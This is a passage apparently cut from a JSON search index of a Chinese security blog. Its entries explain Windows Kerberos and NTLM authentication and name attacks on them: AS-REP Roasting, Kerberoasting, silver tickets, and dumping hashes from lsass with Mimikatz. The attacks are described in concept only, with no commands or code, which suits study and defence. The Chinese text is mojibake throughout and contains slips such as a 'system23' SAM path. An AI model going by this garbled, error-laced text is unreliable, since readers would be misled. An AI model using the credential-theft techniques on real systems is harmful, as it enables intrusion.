å¯†çš„Longon Session Keyè¿›è¡Œç¦»çº¿ç ´è§£ï¼Œå¦‚æœç ´è§£æˆåŠŸï¼Œå¯ä»¥è·å¾—ç”¨æˆ·çš„å¯†ç æ˜æ–‡ï¼Œå³å®Œæˆäº†AS-REP Roastingæ”»å‡»\nTGS-REPé˜¶æ®µçš„å®‰å…¨é—®é¢˜ 1.Kerberoastingæ”»å‡» ä¸Šæ–‡æåˆ°ï¼ŒSTæ˜¯ç”¨æœåŠ¡çš„å¯†é’¥åŠ å¯†ï¼Œå› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬èƒ½è·å–åˆ°STï¼Œå°±å¯ä»¥å°è¯•å¯¹STè¿›è¡Œç ´è§£ï¼Œå¾—åˆ°æœåŠ¡çš„å¯†é’¥ï¼Œé€ æˆäº†Kerberoastingæ”»å‡»\nè¿˜æœ‰ä¸€ä¸ªåŸå› æ˜¯å½“ç”¨æˆ·å‘KDCå‘èµ·TGS-REQæ—¶ï¼Œä¸è®ºç”¨æˆ·æ˜¯å¦æœ‰æœåŠ¡çš„è®¿é—®æƒé™ï¼Œåªè¦TGTæ­£ç¡®ï¼ŒKDCéƒ½ä¼šè¿”å›ST\n2.ç™½é“¶ç¥¨æ®æ”»å‡» åŒæ ·ï¼Œå› ä¸ºSTæ˜¯ç”¨æœåŠ¡çš„å¯†é’¥åŠ å¯†ï¼Œå¦‚æœæˆ‘ä»¬è·å–åˆ°æœåŠ¡çš„å¯†é’¥ï¼Œå°±å¯ä»¥ç­¾å‘ä»»æ„çš„STï¼Œè¿™ä¸ªç¥¨æ®åˆç§°ä¸ºç™½é“¶ç¥¨æ®ï¼Œå³å®Œæˆäº†ç™½é“¶ç¥¨æ®æ”»å‡»\n",
        "summary": "Windowsåè®®ä¹‹Kerberos Kerberosåè®®ä¸€ç§ç½‘ç»œèº«ä»½éªŒè¯åè®®ï¼Œæ˜¯ä¸€ç§åœ¨å¼€æ”¾çš„éå®‰å…¨ç½‘ç»œä¸­è®¤è¯å¹¶è¯†åˆ«ç”¨æˆ·èº«ä»½ä¿¡æ¯çš„æ–¹æ³•ï¼Œæ—¨åœ¨ä½¿ç”¨å¯†é’¥åŠ å¯†æŠ€æœ¯ä¸ºå®¢æˆ·ç«¯/æœåŠ¡ç«¯æä¾›åº”ç”¨ç¨‹åºæä¾›å¼ºèº«ä»½éªŒè¯\nKerberosæœ¬æ¥æ˜¯è¥¿æ–¹ç¥è¯ä¸­å®ˆå«åœ°ç‹±ä¹‹é—¨çš„ä¸‰å¤´çŠ¬çš„åå­—ï¼Œä¹‹æ‰€ä»¥ä½¿ç”¨è¿™ä¸ªåå­—ï¼Œæ˜¯å› ä¸ºè¯¥åè®®éœ€è¦ä¸‰æ–¹å…±åŒå‚ä¸æ‰èƒ½å®Œæˆä¸€æ¬¡è®¤è¯ã€‚\nç›®å‰ä¸»æµä½¿ç”¨çš„Kerberosç‰ˆæœ¬ä¸º2005å¹´RFC4120**(https://www.rfc-editor.org/rfc/rfc4120.html)**æ ‡å‡†å®šä¹‰çš„KerberosV5ç‰ˆæœ¬ï¼ŒWindowsã€Linuxå’ŒMac OSå‡æ”¯æŒKerberosåè®®\nä¸€ã€KerberosåŸºç¡€ åœ¨Kerberosåè®®ä¸­ï¼Œä¸»è¦æœ‰ä»¥ä¸‹ä¸‰ä¸ªè§’è‰²ï¼š\nè®¿é—®æœåŠ¡çš„å®¢æˆ·ç«¯ï¼šKerberoså®¢æˆ·ç«¯ä»£è¡¨éœ€è¦è®¿é—®èµ„æºçš„ç”¨æˆ·è¿›è¡Œæ“ä½œçš„åº”ç”¨ç¨‹åºï¼Œä¾‹å¦‚æ‰“å¼€æ–‡ä»¶ã€æŸ¥è¯¢æ•°æ®åº“æˆ–æ‰“å°æ–‡æ¡£ã€‚æ¯ä¸ªKerberoså®¢æˆ·ç«¯åœ¨è®¿é—®èµ„æºä¹‹å‰éƒ½ä¼šè¯·æ±‚èº«ä»½éªŒè¯\næä¾›æœåŠ¡çš„æœåŠ¡ç«¯ï¼šåŸŸå†…æä¾›æœåŠ¡çš„æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯éƒ½æœ‰å”¯ä¸€çš„SPNï¼ˆæœåŠ¡ä¸»ä½“åç§°ï¼‰\næä¾›è®¤è¯æœåŠ¡çš„KDCï¼ˆKey Distribution Centerï¼Œå¯†é’¥åˆ†å‘ä¸­å¿ƒï¼‰ï¼šKDCæ˜¯ä¸€ç§ç½‘ç»œæœåŠ¡ï¼Œå®ƒå‘æ´»åŠ¨ç›®å½•åŸŸå†…çš„ç”¨æˆ·å’Œè®¡ç®—æœºæä¾›ä¼šè¯ç¥¨æ®å’Œä¸´æ—¶ä¼šè¯å¯†é’¥ï¼Œå…¶æœåŠ¡è´¦æˆ·ä¸ºkrbtgtã€‚KDCä½œä¸ºæ´»åŠ¨ç›®å½•åŸŸæœåŠ¡çš„ä¸€éƒ¨åˆ†è¿è¡Œåœ¨æ¯ä¸ªåŸŸæ§ä¸Š\nè¿™é‡Œçš„krbtgtè´¦æˆ·æ˜¯åœ¨åˆ›å»ºæ´»åŠ¨ç›®å½•æ—¶ç³»ç»Ÿè‡ªåŠ¨åˆ›å»ºçš„ä¸€ä¸ªè´¦æˆ·ï¼Œå…¶ä½œç”¨æ˜¯åœ¨KDCçš„æœåŠ¡è´¦æˆ·ï¼Œå…¶å¯†ç æ˜¯ç³»ç»Ÿéšæœºç”Ÿæˆçš„ï¼Œæ— æ³•æ­£å¸¸ç™»é™†ä¸»æœº\nè€ŒKDCåŒ…å«ASï¼ˆAuthentication Serverï¼Œè®¤è¯æœåŠ¡å™¨ï¼‰å’ŒTGSï¼ˆTicket Granting Serverï¼Œç¥¨æ®æˆæƒæœåŠ¡å™¨ï¼‰\nKerberosæ˜¯ä¸€ç§åŸºäºç¥¨æ®ï¼ˆTicketï¼‰çš„è®¤è¯æ–¹å¼ã€‚å®¢æˆ·ç«¯æƒ³è¦è®¿é—®æœåŠ¡ç«¯çš„æŸä¸ªæœåŠ¡ï¼Œé¦–å…ˆéœ€è¦è´­ä¹°æœåŠ¡ç«¯è®¤å¯çš„STï¼ˆService Ticketï¼ŒæœåŠ¡ç¥¨æ®ï¼‰ã€‚é€šä¿—ç‚¹è¯´ï¼Œå°±æ˜¯å®¢æˆ·ç«¯åœ¨è®¿é—®æœåŠ¡å‰éœ€è¦å…ˆä¹°ç¥¨ï¼Œç­‰å¾…æœåŠ¡ç«¯éªŒç¥¨ä¹‹åæ‰å…è®¸è®¿é—®ã€‚è€Œè¯¥ç¥¨æ®ä¸èƒ½ç›´æ¥è´­ä¹°ï¼Œè¿˜éœ€è¦ä¸€å¼ TGTï¼ˆTiket Granting Tiketï¼Œè®¤è´­æƒè¯ï¼‰ã€‚ä¹Ÿå°±æ˜¯è¯´å®¢æˆ·ç«¯åœ¨ä¹°ç¥¨å‰è¿˜éœ€è¦è·å¾—ä¸€å¼ TGTã€‚è€ŒSTå’ŒTGTå‡ç”±KDCå‘æ”¾ï¼Œå› ä¸ºKDCè¿è¡Œåœ¨åŸŸæ§ä¸Šï¼Œæ‰€ä»¥TGTå’ŒSTä¹Ÿå‡ç”±åŸŸæ§å‘æ”¾\nKerberosåè®®ä½¿ç”¨TCP/UDP 88 ç«¯å£è¿›è¡Œè®¤è¯ï¼Œä½¿ç”¨TCP/UDP 464 ç«¯å£è¿›è¡Œå¯†ç é‡è®¾\nKerberosåè®®æœ‰ä¸¤ä¸ªåŸºç¡€è®¤è¯æ¨¡å—ï¼šAS_REQ\u0026amp;AS_REP å’Œ TGS_REQ\u0026amp;TGS_REPï¼Œä»¥åŠå¾®è½¯æ‰©å±•çš„ä¸¤ä¸ªè®¤è¯æ¨¡å—S4Uå’ŒPACã€‚S4Uæ˜¯å¾®è½¯ä¸ºäº†å®ç°å§”æ´¾è€Œæ‰©å±•çš„æ¨¡å—ï¼Œåˆ†ä¸ºS4u2Selfå’ŒS4u2Proxyã€‚åœ¨Kerberosæœ€åˆè®¾è®¡çš„æµç¨‹é‡Œåªè¯´æ˜äº†å¦‚ä½•è¯æ˜å®¢æˆ·ç«¯çš„çœŸå®èº«ä»½ï¼Œå¹¶æ²¡æœ‰è¯´æ˜å®¢æˆ·ç«¯æ˜¯å¦æœ‰æƒé™è®¿é—®è¯¥æœåŠ¡ï¼Œå› ä¸ºåœ¨åŸŸä¸­ä¸åŒæƒé™çš„ç”¨æˆ·èƒ½å¤Ÿè®¿é—®çš„èµ„æºæ˜¯ä¸åŒçš„ã€‚å¾®è½¯ä¸ºäº†è§£å†³è¯¥é—®é¢˜ï¼Œå¼•å…¥äº†PACï¼ˆPrivilige Attribute Certificateï¼Œç‰¹æƒå±æ€§è¯ä¹¦ï¼‰çš„æ¦‚å¿µ\näºŒã€PAC PACåŒ…å«å„ç§æˆæƒä¿¡æ¯ã€é™„åŠ å‡­æ®ä¿¡æ¯ã€é…ç½®æ–‡ä»¶å’Œç­–ç•¥ä¿¡æ¯ç­‰ï¼Œä¾‹å¦‚ç”¨æˆ·æ‰€å±çš„ç”¨æˆ·ç»„ã€ç”¨æˆ·æ‰€å…·æœ‰çš„æƒé™ç­‰ã€‚ä¸Šæ–‡æåˆ°è¿‡ï¼Œåœ¨æœ€åˆçš„RFC1510è§„å®šçš„æ ‡å‡†Kerberosè®¤è¯è¿‡ç¨‹ä¸­å¹¶æ²¡æœ‰PACï¼Œå¾®è½¯åœ¨è‡ªå·±çš„äº§å“å®ç°çš„Kerberosæµç¨‹ä¸­åŠ å…¥äº†PACçš„æ¦‚å¿µ\nåœ¨ä¸€ä¸ªæ­£å¸¸çš„kerberosè®¤è¯æµç¨‹ä¸­ï¼ŒKDCè¿”å›çš„TGTçš„STéƒ½å¸¦æœ‰PACï¼Œè¿™æ ·çš„å¥½å¤„æ˜¯åœ¨ä»¥åå¯¹èµ„æºçš„è®¿é—®ä¸­ï¼ŒæœåŠ¡ç«¯æ¥æ”¶åˆ°å®¢æˆ·è¯·æ±‚çš„æ—¶å€™ä¸å†éœ€è¦å€ŸåŠ©KDCæä¾›å®Œæ•´çš„æˆæƒä¿¡æ¯æ¥å®Œæˆå¯¹ç”¨æˆ·æƒé™çš„åˆ¤æ–­ï¼Œè€Œåªéœ€è¦æ ¹æ®è¯·æ±‚ä¸­æ‰€åŒ…å«çš„PACä¿¡æ¯ç›´æ¥ä¸æœ¬åœ°èµ„æºçš„ACLç›¸æ¯”è¾ƒæ¥åšå‡ºè£å†³\n1.PACç»“æ„ PACçš„é¡¶éƒ¨ç»“æ„æ˜¯è¿™æ ·çš„ï¼š\ntypedef unsigned long ULONG; typedef unsigned short USHORT; typedef unsigned long64 ULONG64; typedef unsigned char UCHAR; typedef struct _PACTYPE { ULONG cBuffers; ULONG Version; PAC_INFO_BUFFER Buffers[1]; } PACTYPE; å„å­—æ®µå«ä¹‰:\ncBuffersï¼šåŒ…å«æ•°ç»„ç¼“å†²åŒºä¸­çš„æ¡ç›®æ•° Versionï¼šç‰ˆæœ¬ Buffersï¼šåŒ…å«ä¸€ä¸ªPAC_INFO_BUFFERç»“æ„çš„æ•°ç»„ è€ŒPAC_INFO_BUFFERç»“æ„åŒ…å«å…³äºæ¯ä¸ªéƒ¨åˆ†çš„ä¿¡æ¯ï¼Œéå¸¸é‡è¦ï¼š\n"
    }
,
    {
        "title": "Windowsåè®®ä¹‹NTLM",
        "link": "/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%8D%8F%E8%AE%AE/windows%E5%8D%8F%E8%AE%AE%E4%B9%8Bntlm/",
        "content": "Windowsåè®®ä¹‹NTLM NTLMåè®®ï¼ˆNew Technology LAN Managerï¼‰åè®®æ˜¯å¾®è½¯ç”¨äºWindowsèº«ä»½éªŒè¯çš„ä¸»è¦åè®®ä¹‹ä¸€\næ—©æœŸSMBåè®®ä»¥æ˜æ–‡å£ä»¤çš„å½¢å¼åœ¨ç½‘ç»œä¸Šä¼ é€’ï¼Œå­˜åœ¨å®‰å…¨æ€§é—®é¢˜ï¼Œè¿›è€Œå‡ºç°äº†LMï¼ˆLAN managerï¼‰åè®®ï¼Œç„¶è€Œè¯¥åè®®å› ä¸ºå¤ªç®€å•ï¼Œè¿˜æ˜¯å®¹æ˜“è¢«ç ´è§£ï¼Œå¾®è½¯è¿›è€Œæå‡ºäº†NTLMåè®®\nNTLMåè®®æ—¢å¯ç”¨äºå·¥ä½œç»„ç¯å¢ƒä¸­çš„æœºå™¨èº«ä»½éªŒè¯ï¼Œåˆå¯ç”¨äºåŸŸç¯å¢ƒèº«ä»½éªŒè¯ï¼Œè¿˜å¯ä»¥ä¸º SMBã€HTTPã€LDAPã€SMTP ç­‰ä¸Šå±‚å¾®è½¯åº”ç”¨æä¾›èº«ä»½éªŒè¯\nå€¼å¾—ä¸€æçš„æ˜¯ï¼šNTLMæ˜¯åº•å±‚çš„è®¤è¯åè®®ï¼Œå¿…é¡»åµŒå…¥ä¸Šå±‚åº”ç”¨åè®®ä¸­ï¼Œæ¶ˆæ¯çš„ä¼ è¾“ä¾èµ–äºä½¿ç”¨NTLMçš„ä¸Šå±‚åè®®ï¼Œæ¯”å¦‚SMBã€HTTPç­‰\nä¸€ã€SSPIä¸SSPçš„æ¦‚å¿µ 1.SSPI SSPIï¼ˆSecurity Service Provider Interfaceï¼Œå®‰å…¨æœåŠ¡æä¾›æ¥å£ï¼‰æ˜¯windowså®šä¹‰çš„ä¸€å¥—æ¥å£ï¼Œè¯¥æ¥å£å®šä¹‰äº†ä¸å®‰å…¨æœ‰å…³çš„åŠŸèƒ½å‡½æ•°ï¼ŒåŒ…å«ä½†ä¸é™äºï¼š\nèº«ä»½éªŒè¯æœºåˆ¶ ä¸ºå…¶ä»–åè®®æä¾›çš„session securityï¼ˆä¼šè¯å®‰å…¨ï¼‰æœºåˆ¶ï¼Œä¼šè¯å®‰å…¨å¯ä¸ºé€šä¿¡æä¾›æ•°æ®çš„å®Œæ•´æ€§æ ¡éªŒä»¥åŠæ•°æ®çš„åŠ å¯†ã€è§£å¯†åŠŸèƒ½ æ³¨æ„ï¼šSSPIåªæ˜¯å®šä¹‰äº†ä¸€å¥—æ¥å£å‡½æ•°ï¼Œå¹¶æ²¡æœ‰å®ç°å…·ä½“å†…å®¹\n2.SSP SSPï¼ˆSecurity Service Providerï¼Œå®‰å…¨æœåŠ¡æä¾›è€…ï¼‰æ˜¯SSPIçš„å®ç°è€…ï¼Œå¾®è½¯è‡ªå·±å®ç°äº†å¾ˆå¤šSSPï¼Œç”¨äºæä¾›å®‰å…¨åŠŸèƒ½ï¼Œä¾‹å¦‚ï¼š\nNTLM SSPï¼šWindows NT 3.51ä¸­å¼•å…¥ï¼ˆmsv1_0.dllï¼‰ï¼Œä¸ºWindows 2000ä¹‹å‰çš„å®¢æˆ·ç«¯-æœåŠ¡å™¨åŸŸå’ŒéåŸŸèº«ä»½éªŒè¯ï¼ˆSMB/CIFSï¼‰æä¾› NTLM è´¨è¯¢/å“åº”èº«ä»½éªŒè¯ Kerberos SSPï¼šWindows 2000ä¸­å¼•å…¥ï¼ŒWindows vistaä¸­æ›´æ–°ä¸ºæ”¯æŒAESï¼ˆkerberos.dllï¼‰ï¼ŒWindows 2000åŠæ›´é«˜ç‰ˆæœ¬ä¸­é¦–é€‰çš„å®¢æˆ·ç«¯-æœåŠ¡å™¨åŸŸç›¸äº’èº«ä»½éªŒè¯ Digest SSPï¼šWindows XPä¸­å¼•å…¥ï¼ˆwdigest.dllï¼‰ï¼Œåœ¨ Windows ä¸ kerberos ä¸å¯ç”¨çš„éWindowsç³»ç»Ÿé—´æä¾›åŸºäº HTTP å’Œ SASL èº«ä»½éªŒè¯çš„è´¨è¯¢/å“åº” Negotiate SSP:Windows 2000 ä¸­å¼•å…¥ï¼ˆsecur32.dll) ï¼Œé»˜è®¤é€‰æ‹© Kerberosï¼Œå¦‚æœä¸å¯ç”¨åˆ™é€‰æ‹© NTLM åè®®ã€‚Negotiate SSP æä¾›å•ç‚¹ç™»å½•èƒ½åŠ›ï¼Œæœ‰æ—¶ç§°ä¸ºé›†æˆ Windows èº«ä»½éªŒè¯ï¼ˆå°¤å…¶æ˜¯ç”¨äº IIS æ—¶)ã€‚åœ¨ Windows 7 åŠæ›´é«˜ç‰ˆæœ¬ä¸­ï¼ŒNEGOExts å¼•å…¥äº†åå•†ä½¿ç”¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¸Š æ”¯æŒçš„å·²å®‰è£…å®šåˆ¶ SSP è¿›è¡Œèº«ä»½éªŒè¯ Cred SSP:Windows Vista ä¸­å¼•å…¥ï¼ŒWindows XP SP3 ä¸Šä¹Ÿå¯ç”¨ ï¼ˆcredssp.dll)ï¼Œä¸ºè¿œç¨‹æ¡Œé¢è¿æ¥æä¾›å•ç‚¹ç™»å½•ï¼ˆSSO)å’Œç½‘ç»œçº§èº«ä»½éªŒè¯ Schannel SSP:Windows 2000 ä¸­å¼•å…¥ï¼ˆSchannel.dll)ï¼ŒWindows Vista ä¸­ æ›´æ–°ä¸ºæ”¯æŒæ›´å¼ºçš„ AES åŠ å¯†å’Œ ECC[6] è¯¥æä¾›è€…ä½¿ç”¨ SSL/TLS è®°å½•æ¥åŠ å¯†æ•°æ®æœ‰æ•ˆè½½è· PKU2U SSP:Windows 7 ä¸­å¼•å…¥ï¼ˆpku2u.dll) ï¼Œ åœ¨ä¸éš¶å±åŸŸçš„ç³»ç»Ÿä¹‹é—´æä¾›ä½¿ç”¨æ•°å­—è¯ä¹¦çš„å¯¹ç­‰èº«ä»½éªŒè¯ å› ä¸ºSSPIä¸­å®šä¹‰äº†ä¸session securityæœ‰å…³çš„APIï¼Œæ‰€ä»¥ä¸Šå±‚åº”ç”¨åˆ©ç”¨ä»»ä½•SSPä¸è¿œç¨‹çš„æœåŠ¡è¿›è¡Œèº«ä»½éªŒè¯åï¼Œæ­¤SSPéƒ½ä¼šä¸ºæœ¬æ¬¡è¿æ¥ç”Ÿæˆä¸€ä¸ªéšæœºkeyï¼Œè¿™ä¸ªkeyè¢«ç§°ä¸ºsession keyã€‚ä¸Šå±‚åº”ç”¨ç»è¿‡èº«ä»½éªŒè¯åï¼Œå¯ä»¥é€‰æ‹©æ€§çš„ä½¿ç”¨è¿™ä¸ªkeyå¯¹ä¹‹åå‘å¾€æœåŠ¡ç«¯æˆ–æ¥æ”¶è‡ªèº«æœåŠ¡ç«¯çš„æ•°æ®è¿›è¡Œç­¾åæˆ–åŠ å¯†\nåœ¨ç³»ç»Ÿå±‚é¢ï¼ŒSSPå°±æ˜¯ä¸€ä¸ªdllï¼ˆåŠ¨æ€é“¾æ¥åº“ï¼‰ï¼Œç”¨æ¥å®ç°èº«ä»½éªŒè¯ç­‰å®‰å…¨åŠŸèƒ½ã€‚ä¸åŒçš„SSPå®ç°çš„èº«ä»½éªŒè¯æœºåˆ¶æ˜¯ä¸ä¸€æ ·çš„ï¼Œæ¯”å¦‚NTLM SSPå®ç°çš„æ˜¯ä¸€ç§åŸºäºè´¨è¯¢/å“åº”çš„èº«ä»½éªŒè¯æœºåˆ¶ï¼Œè€ŒKerberos SSPå®ç°çš„æ˜¯åŸºäºTicketï¼ˆç¥¨æ®ï¼‰çš„èº«ä»½éªŒè¯æœºåˆ¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç¼–å†™è‡ªå·±çš„SSPå¹¶å°†å…¶æ³¨å†Œåˆ°æ“ä½œç³»ç»Ÿä¸­ï¼Œè®©æ“ä½œç³»ç»Ÿæ”¯æŒæˆ‘ä»¬è‡ªå®šä¹‰çš„èº«ä»½éªŒè¯æ–¹æ³•\nå¯ä»¥ç”¨ä¸€å¼ å›¾è¡¨ç¤ºSSPIã€SSPå’Œå„ç§åº”ç”¨çš„å…³ç³»ï¼š\näºŒã€LM Hash åŠ å¯†ç®—æ³• LMæ˜¯å¾®è½¯æ¨å‡ºçš„ä¸€ä¸ªèº«ä»½è®¤è¯åè®®ï¼Œä½¿ç”¨çš„åŠ å¯†ç®—æ³•æ˜¯LM Hashï¼Œæ­¤åŠ å¯†çš„æœ¬è´¨æ˜¯DESåŠ å¯†ï¼Œè™½ç„¶å…¶å®¹æ˜“è¢«ç ´è§£ï¼Œä½†ä¸ºäº†ä¿è¯ç³»ç»Ÿå…¼å®¹æ€§ï¼Œwindowsåªæ˜¯å°†LM Hashç¦ç”¨ï¼ˆä»windows vistaå’Œwindows server 2008å¼€å§‹é»˜è®¤ç¦ç”¨ï¼‰\nLM Hashæ˜æ–‡å¯†ç è¢«é™å®šåœ¨14ä½ä»¥å†…ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè‹¥è¦åœæ­¢ä½¿ç”¨LM Hashï¼Œå°†ç”¨æˆ·çš„å¯†ç è®¾ç½®ä¸º14ä½ä»¥ä¸Šå³å¯ï¼Œå¦‚æœæ”»å‡»è€…æŠ“å–çš„LM Hashä¸º\u0026quot;aad3b435b51404eeaad3b435b51404ee\u0026quot;ï¼Œè¯´æ˜LM Hashä¸ºç©ºå€¼æˆ–è¢«ç¦ç”¨äº†\nä¸‰ã€NTLM HashåŠ å¯†ç®—æ³• NTLM HashåŠ å¯†ç®—æ³•æ˜¯å¾®è½¯ä¸ºäº†åœ¨æé«˜å®‰å…¨æ€§çš„åŒæ—¶ï¼Œä¿è¯å…¼å®¹æ€§è€Œè®¾è®¡çš„æ•£åˆ—åŠ å¯†ç®—æ³•ï¼Œå®ƒæ˜¯åŸºäºMD4åŠ å¯†ç®—æ³•è¿›è¡ŒåŠ å¯†çš„\nä¸ºäº†è§£å†³LM HashåŠ å¯†å’Œèº«ä»½éªŒè¯æ–¹æ¡ˆä¸­å›ºæœ‰çš„å®‰å…¨å¼±ç‚¹ï¼Œå¾®è½¯äº1993å¹´åœ¨windows NT 3.1ä¸­é¦–æ¬¡å¼•å…¥äº†NTLM Hashï¼Œä»windows vistaå’Œwindows server 2008å¼€å§‹ï¼Œé»˜è®¤ç¦ç”¨äº†LM Hashï¼Œåªå­˜å‚¨NTLM Hashï¼Œè€ŒLM Hashçš„ä½ç½®åˆ™ä¸ºç©º:\naad3b435b51404eeaad3b435b51404ee 1.NTLM HashåŠ å¯†æµç¨‹ NTLM Hashæ˜¯ç”±æ˜æ–‡å¯†ç ç»è¿‡ä¸‰æ­¥åŠ å¯†è€Œæˆï¼š\nNTLM Hash =md4(unicode(hex(password))) å…·ä½“å¦‚ä¸‹ï¼š\nå…ˆå°†ç”¨æˆ·å¯†ç è½¬æ¢ä¸º16è¿›åˆ¶æ ¼å¼ å†å°†16è¿›åˆ¶æ ¼å¼çš„å­—ç¬¦ä¸²è¿›è¡ŒASCIIè½¬Unicodeç¼–ç  æœ€åå¯¹Unicodeç¼–ç çš„16è¿›åˆ¶å­—ç¬¦ä¸²è¿›è¡Œæ ‡å‡†MD4å•å‘å“ˆå¸ŒåŠ å¯† 2.windowsç³»ç»Ÿå­˜å‚¨çš„NTLM HashåŠNTLMæœ¬åœ°è®¤è¯ ç”¨æˆ·çš„å¯†ç ç»è¿‡NTLM HashåŠ å¯†åå­˜å‚¨åœ¨C:\\Windows\\system23\\config\\SAMæ–‡ä»¶ä¸­\nåœ¨ç”¨æˆ·è¾“å…¥å¯†ç è¿›è¡Œèº«ä»½éªŒè¯çš„è¿‡ç¨‹ä¸­ï¼Œæ‰€æœ‰æ“ä½œéƒ½æ˜¯åœ¨æœ¬åœ°è¿›è¡Œçš„ã€‚ç³»ç»Ÿå°†ç”¨æˆ·è¾“å…¥çš„å¯†ç è½¬æ¢ä¸ºNTLM Hashï¼Œå†å°†å…¶ä¸SAMä¸­çš„NTLM Hashæ–‡ä»¶è¿›è¡Œæ¯”è¾ƒï¼Œè‹¥ç›¸åŒåˆ™è¯´æ˜å¯†ç æ­£ç¡®ï¼Œåä¹‹åˆ™ä¸ºé”™è¯¯ã€‚å½“ç”¨æˆ·æ³¨é”€ã€é‡å¯ã€é”å±åï¼Œæ“ä½œç³»ç»Ÿä¼šè®©winlog.exeæ˜¾ç¤ºç™»é™†ç•Œé¢ï¼Œå³å¯†ç è¾“å…¥æ¡†ï¼Œåœ¨winlog.exeç¨‹åºæ¥æ”¶åˆ°è¾“å…¥ä¹‹åï¼Œä¼šå°†å¯†ç äº¤ç»™lsass.exeè¿›ç¨‹ï¼Œlsass.exeè¿›ç¨‹ä¸­ä¼šå­˜å‚¨ä¸€ä»½æ˜æ–‡å¯†ç ï¼Œå¹¶å°†å…¶åŠ å¯†æˆNTLM Hashï¼Œä¸SAMæ•°æ®åº“è¿›è¡Œæ¯”è¾ƒå’Œè®¤è¯\nåœ¨ä¸Šè¿°è¿‡ç¨‹ä¸­ï¼Œæœ‰ä¸ªlsass.exeè¿›ç¨‹ï¼Œæˆ‘ä»¬åœ¨æ¸—é€è¿‡ç¨‹ä¸­ä½¿ç”¨çš„Mimikatzå°±æ˜¯ä»è¯¥è¿›ç¨‹ä¸­æŠ“å–çš„æ˜æ–‡æˆ–Hashå¯†ç \nä½¿ç”¨MSFæˆ–CSé€šè¿‡è½¬å‚¨HashæŠ“åˆ°çš„å¯†ç æ ¼å¼å¦‚ä¸‹ï¼š\nç”¨æˆ·å:ç”¨æˆ·SID:LM Hash:NTLM Hash::: å››ã€NTLMåè®®è®¤è¯ NTLMåè®®æ˜¯ä¸€ç§åŸºäºChallenge/Responseï¼ˆè´¨è¯¢/å“åº”ï¼‰çš„éªŒè¯æœºåˆ¶ï¼Œç”±ä¸‰ç§ç±»å‹æ¶ˆæ¯ç»„æˆï¼š\nType 1ï¼ˆåå•†ï¼ŒNegotiateï¼‰ Type 2ï¼ˆè´¨è¯¢ï¼ŒChallengeï¼‰ Type 3ï¼ˆè®¤è¯ï¼ŒAuthenticationï¼‰ 1.å·¥ä½œç»„ç¯å¢ƒä¸‹çš„NTLMè®¤è¯ å·¥ä½œç»„ç¯å¢ƒä¸‹çš„NTLMè®¤è¯å¦‚ä¸‹ï¼š\nå½“å®¢æˆ·ç«¯éœ€è¦è®¿é—®æœåŠ¡å™¨çš„æŸä¸ªæœåŠ¡æ—¶ï¼Œå°±éœ€è¦è¿›è¡Œèº«ä»½éªŒè¯ã€‚åœ¨å®¢æˆ·ç«¯è¾“å…¥æœåŠ¡å™¨çš„ç”¨æˆ·åå’Œå¯†ç è¿›è¡ŒéªŒè¯åï¼Œå°±ä¼šç¼“å­˜ç”¨æˆ·è¾“å…¥çš„æœåŠ¡å™¨å¯†ç çš„NTLM Hashå€¼ï¼Œç„¶åï¼Œå®¢æˆ·ç«¯ä¼šå‘æœåŠ¡ç«¯å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œè¯¥è¯·æ±‚åˆ©ç”¨NTLM SSPç”ŸæˆNTLMSSP_NEGOTIATEæ¶ˆæ¯ï¼ˆè¢«ç§°ä¸ºType 1åå•†æ¶ˆæ¯ï¼‰\næœåŠ¡ç«¯æ¥æ”¶åˆ°å®¢æˆ·ç«¯å‘é€è¿‡æ¥çš„Type 1æ¶ˆæ¯åï¼Œè¯»å–å…¶ä¸­çš„å†…å®¹ï¼Œå¹¶ä»ä¸­é€‰æ‹©è‡ªå·±æ‰€èƒ½æ¥å—çš„æœåŠ¡å†…å®¹ã€åŠ å¯†ç­‰çº§ã€å®‰å…¨æœåŠ¡ç­‰ï¼Œç„¶åä¼ å…¥NTLM SSPå¾—åˆ°NTLMSSP_CHALLENGEæ¶ˆæ¯ï¼ˆè¢«ç§°ä¸ºType 2è´¨è¯¢æ¶ˆæ¯ï¼‰ï¼Œå¹¶å°†æ­¤Type 2æ¶ˆæ¯å‘å›ç»™å®¢æˆ·ç«¯ï¼Œæ¶ˆæ¯ä¸­åŒ…å«ä¸€ä¸ªç”±æœåŠ¡å™¨ç”Ÿæˆçš„16ä½éšæœºå€¼ï¼Œè¢«ç§°ä¸ºchallengeå€¼ï¼ŒæœåŠ¡ç«¯æ”¶åˆ°åä¼šå¯¹å…¶è¿›è¡Œç¼“å­˜\nå®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡ç«¯è¿”å›çš„Type 2æ¶ˆæ¯åï¼Œè¯»å–æœåŠ¡ç«¯æ‰€æ”¯æŒçš„å†…å®¹ï¼Œå¹¶å–å‡ºå…¶ä¸­çš„challengeå€¼ï¼Œç”¨ç¼“å­˜çš„NTLM Hashå¯¹å…¶è¿›è¡ŒåŠ å¯†å¾—åˆ°Responseä¿¡æ¯ï¼Œæœ€åå°†Responseã€ç”¨æˆ·åã€challengeç­‰ä¿¡æ¯ç»„åˆå¾—åˆ°Net-NTLM Hashï¼Œå†å°†Net-NTLM Hashå°è£…åˆ°NTLMSSP_AUTHæ¶ˆæ¯ä¸­ï¼ˆè¢«ç§°ä¸ºType 3è®¤è¯æ¶ˆæ¯ï¼‰ï¼Œå‘é€ç»™æœåŠ¡ç«¯\næœåŠ¡ç«¯æ”¶åˆ°è®¤è¯æ¶ˆæ¯åï¼Œä»Net-NTLM Hashä¸­å–å‡ºresponseï¼Œç„¶åç”¨è‡ªå·±å¯†ç çš„HTLM Hashå¯¹challengeå€¼è¿›è¡ŒåŠ å¯†ï¼Œå¾—åˆ°è‡ªå·±çš„responseï¼Œå°†å®¢æˆ·ç«¯å‘é€çš„responseå’Œè‡ªå·±çš„ä½œæ¯”è¾ƒåˆ¤æ–­æ˜¯å¦ç›¸ç­‰ï¼Œè‹¥ç›¸ç­‰ï¼Œåˆ™è¯æ˜å®¢æˆ·ç«¯è¾“å…¥çš„å¯†ç æ­£ç¡®ï¼Œè®¤è¯æˆåŠŸï¼Œåä¹‹åˆ™è®¤è¯å¤±è´¥\nå¯ç”»ä¸€å¼ 